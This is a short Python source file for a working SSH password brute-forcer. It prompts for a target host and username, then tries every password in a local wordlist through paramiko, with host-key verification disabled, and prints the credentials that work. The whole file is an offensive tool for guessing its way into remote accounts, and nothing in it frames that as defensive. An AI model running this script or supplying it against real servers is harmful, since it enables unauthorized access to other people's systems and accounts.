from socket import socket
from time import sleep

import paramiko

from colors import colors, print_info, print_success


def start():
    # TODO clear the screen and print an ssh banner 
    host = input(f"{colors.FAIL}What is the Host? {colors.BLUE}")
    username = input(f"{colors.FAIL}What is the Username? {colors.BLUE}")
    print(host)
    f = open('./passlist', 'r')
    passwords = f.readlines()
    for password in passwords:
      connected = attempt_to_login(host, username, password.rstrip())
      if connected:
        sleep(5)
        return

def attempt_to_login(host: str, username: str, password: str):
  try:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print_info(f'[-] --- Attempting to login with {host}, {username}, {password}')
    ssh.connect(host, username=username, password=password, timeout=1.5)
    ssh.close()
    print(f"""{colors.WARNING}
---- [!] SUCCESSFULLY CONNECTED WITH ---- 
   {colors.GREEN}{username}@{host} password {password}
{colors.WARNING}-----------------------------------------
{colors.ENDC}""")
    return True
  except paramiko.AuthenticationException:
    print('Invalid Credentials bad username or password')
  except:
    print("SOMETHING WENT WRONG")
  return False